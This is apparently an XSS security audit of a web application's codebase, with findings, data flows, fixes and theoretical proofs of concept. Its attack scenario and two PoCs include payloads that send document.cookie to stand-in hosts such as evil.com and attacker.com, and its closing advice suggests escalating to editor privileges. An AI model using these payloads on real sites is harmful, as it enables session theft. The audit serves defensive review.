# Comprehensive XSS Security Audit

**Auditor:** Elite Bug Hunter Analysis
**Date:** December 17, 2025
**Scope:** Full codebase XSS vulnerability assessment

---

## Executive Summary

| Vector Type | Instances Found | Exploitable | Severity |
|-------------|-----------------|-------------|----------|
| `dangerouslySetInnerHTML` | 61 files | 0 direct | LOW |
| `innerHTML/outerHTML` | 5 instances | 0 direct | LOW |
| `eval()/new Function()` | 3 instances | 1 potential | MEDIUM |
| `postMessage` handlers | Multiple | 0 | LOW |
| URL parameter reflection | Multiple | 0 | LOW |
| SVG/XML injection | 0 | 0 | N/A |

**Overall XSS Risk: LOW-MEDIUM**

---

## Critical Findings

### 1. 🔴 Code Injection via `new Function()` - MEDIUM SEVERITY

**Location:** `packages/styleguide/src/components/Chart/utils.js:257`

```javascript
export const unsafeDatumFn = (code) => new Function('datum', `return ${code}`)
```

**Additional Location:** `apps/www/components/Article/metadata.js:17`

```javascript
fn = new Function('query', code)
return fn(query)
```

**Data Flow Analysis:**

```
Article metadata (editor-created) 
    → articleContent.meta.fromQuery
    → runMetaFromQuery(code, query)
    → new Function('query', code)
    → EXECUTED
```

**Exploitation Requirements:**
- Requires `editor` role to create article with malicious `fromQuery` field
- Code is executed in context of article viewer's browser

**Attack Scenario:**
1. Attacker compromises editor account
2. Creates article with `fromQuery: "fetch('https://evil.com?c='+document.cookie)"`
3. Article published
4. Viewers execute malicious code

**Risk Assessment:** MEDIUM
- Requires elevated privileges (editor role)
- But provides full code execution in victim's browser

---

### 2. 🟡 innerHTML without Sanitization - MEDIUM SEVERITY

**Location:** `apps/www/components/Gallery/Gallery.js:54`

```javascript
captionEl.children[0].innerHTML = innerHtml.join(' ')
```

**Data Flow:**
```javascript
const { caption, byLine } = item  // From gallery items
innerHtml.push(caption)
innerHtml.push(`<small>${byLine}</small>`)
captionEl.children[0].innerHTML = innerHtml.join(' ')
```

**Source Tracing:**
- `caption` and `byLine` come from article/image metadata (MDAST)
- Created by editors via Publikator CMS

**Risk Assessment:** MEDIUM
- Editor-controlled content
- No sanitization before innerHTML assignment

---

### 3. 🟡 External API Data to dangerouslySetInnerHTML - MEDIUM SEVERITY

**Twitter Embeds:**

**Location:** `packages/backend-modules/embeds/lib/twitter/index.js:77-82`

```javascript
const html = sanitizedText
  ? Autolinker.link(sanitizedText, { mention: 'twitter' })
      .replace(/\n/g, '<br/>')
  : null
return { html, ... }
```

**Rendered at:** `packages/styleguide/src/components/Social/Tweet.js`

```javascript
<RawHtml type={Text} dangerouslySetInnerHTML={{ __html: html }} />
```

**Risk Assessment:** LOW
- Twitter sanitizes content at source
- `Autolinker.link()` only creates `<a>` tags
- But no explicit DOMPurify sanitization

---

### 4. 🟢 Search Results - PROPERLY PROTECTED

**Sanitization Function:** `apps/www/lib/sanitizeHTML.ts`

```typescript
export function sanitizeSearchResultHTML(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['em'],  // Only <em> for search highlighting
    ALLOWED_ATTR: [],       // No attributes allowed
  })
}
```

**Usage:** All search result components properly call `sanitizeSearchResultHTML()` before rendering.

---

## All XSS Vectors Analyzed

### 1. dangerouslySetInnerHTML (61 files)

| Category | Count | Risk |
|----------|-------|------|
| Translation strings `t()` | ~35 | 🟢 LOW - Developer controlled |
| JSON.stringify() | ~5 | 🟢 LOW - Escaped |
| DOMPurify sanitized | ~6 | 🟢 LOW - Sanitized |
| CMS/Editor content | ~10 | 🟡 MEDIUM - Requires editor role |
| External API data | ~5 | 🟡 MEDIUM - Pre-sanitized at source |

### 2. innerHTML/outerHTML (5 instances)

| File | Line | Source | Risk |
|------|------|--------|------|
| `packages/styleguide/src/lib/textGauger.ts` | 32 | Text measurement | 🟢 LOW |
| `apps/www/components/Gallery/Gallery.js` | 54 | Article captions | 🟡 MEDIUM |
| `apps/www/components/Audio/AudioPlayer/AudioPlaybackElement.tsx` | 43 | Empty string | 🟢 LOW |
| `apps/publikator/components/editor/modules/chart/Export/utils.js` | 56 | Chart HTML | 🟢 LOW |
| `apps/publikator/components/editor/modules/chart/Export/utils.js` | 225 | SVG outerHTML | 🟢 LOW |

### 3. eval()/new Function() (3 instances)

| File | Line | Code | Risk |
|------|------|------|------|
| `packages/styleguide/src/components/Chart/utils.js` | 257 | `unsafeDatumFn` | 🟡 MEDIUM |
| `apps/www/components/Article/metadata.js` | 17 | `runMetaFromQuery` | 🟡 MEDIUM |
| `apps/admin/components/Users/Dialog/DiscussionSuspensions.js` | 92 | `setInterval` (false positive) | 🟢 N/A |

### 4. postMessage Handlers

| File | Handler | Origin Check | Risk |
|------|---------|--------------|------|
| `apps/www/lib/withInNativeApp.js` | `document.addEventListener('message', ...)` | None | 🟡 |
| `apps/www/components/NativeApp/MessageSync.js` | `document.addEventListener('message', ...)` | None | 🟡 |

**Note:** Uses `document` event (React Native WebView specific), not `window.addEventListener('message')`. Less exploitable but still a concern.

### 5. URL Parameter Handling

| Pattern | Protected |
|---------|-----------|
| Open redirect | ✅ Origin validation in `TokenAuthorization.js` |
| Profile URLs | ✅ `checkProfileUrls` validates http/https only |
| Query parameters | ✅ No direct HTML reflection found |

---

## Attack Surface Summary

### Publicly Exploitable: NONE FOUND

No XSS vectors were found that can be exploited by unauthenticated users.

### Requires Editor Role: 4 VECTORS

1. `new Function()` in Chart utils
2. `new Function()` in Article metadata
3. innerHTML in Gallery captions
4. Article HTML zones (DynamicComponent, IllustrationHtml, ExpandableLink)

### Requires Account Compromise: MEDIUM RISK

If an editor account is compromised:
- Full JavaScript execution in victim browsers via article content
- Session hijacking, defacement, malware distribution possible

---

## Recommendations

### High Priority

1. **Replace `new Function()` with safe alternatives:**

```javascript
// Instead of:
export const unsafeDatumFn = (code) => new Function('datum', `return ${code}`)

// Use a safe expression parser:
import { Parser } from 'expr-eval'
export const safeDatumFn = (code) => {
  const parser = new Parser()
  const expr = parser.parse(code)
  return (datum) => expr.evaluate({ datum })
}
```

2. **Add DOMPurify to all HTML rendering:**

```javascript
// Tweet.js, CommentEmbed.js, Gallery.js
import DOMPurify from 'isomorphic-dompurify'
const sanitizedHtml = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['a', 'br', 'em', 'strong', 'small'],
  ALLOWED_ATTR: ['href', 'target', 'rel'],
})
```

3. **Enable Content Security Policy:**

```javascript
// next.config.js
headers: [
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
  }
]
```

### Medium Priority

4. **Add origin validation to postMessage handlers:**

```javascript
const onMessage = (event) => {
  // Validate origin for non-React Native WebView contexts
  if (!isReactNativeWebView && event.origin !== window.location.origin) {
    return
  }
  // ... handler code
}
```

5. **Audit CMS input sanitization:**
- Verify DatoCMS sanitizes HTML fields
- Consider server-side sanitization for editor content

### Low Priority

6. **Consider sandboxing dynamic components:**
- Use iframe sandbox for DynamicComponent
- Implement Content Security Policy nonce for inline scripts

---

## Proof of Concept (Theoretical)

### PoC 1: Article Metadata Code Injection

**Prerequisites:** Editor account access

**Steps:**
1. Login as editor
2. Create new article via Publikator CMS
3. Set `meta.fromQuery` to:
   ```javascript
   (function(){new Image().src='https://attacker.com/steal?cookie='+document.cookie})()
   ```
4. Publish article
5. When victims view article, cookies are exfiltrated

### PoC 2: Chart Data Filter Injection

**Prerequisites:** Editor account access

**Steps:**
1. Create article with chart component
2. Set chart `filter` prop to:
   ```javascript
   (datum.value > 0) || (fetch('https://attacker.com/xss'))
   ```
3. Chart renders, executing malicious fetch

---

## Conclusion

**Bug Bounty Assessment:**

| Finding | Exploitability | Severity | Bounty Potential |
|---------|----------------|----------|------------------|
| `new Function()` code injection | Requires editor role | Medium | Low-Medium |
| innerHTML without sanitization | Requires editor role | Medium | Low |
| Missing postMessage origin check | Complex exploitation | Low | Low |

**Overall:** The codebase has good security practices for public-facing XSS. The main risk is compromise of editor accounts, which would enable stored XSS attacks. No direct user-input XSS vulnerabilities were found.

**Recommended Focus:** If pursuing bug bounty, focus on finding ways to:
1. Escalate privileges to editor role
2. Bypass editor authentication
3. Find indirect paths to control editor-only data

---

## Files Examined

Total files analyzed: 200+
Grep patterns used: 15+
Manual code review: 50+ files

**Audit completed.**
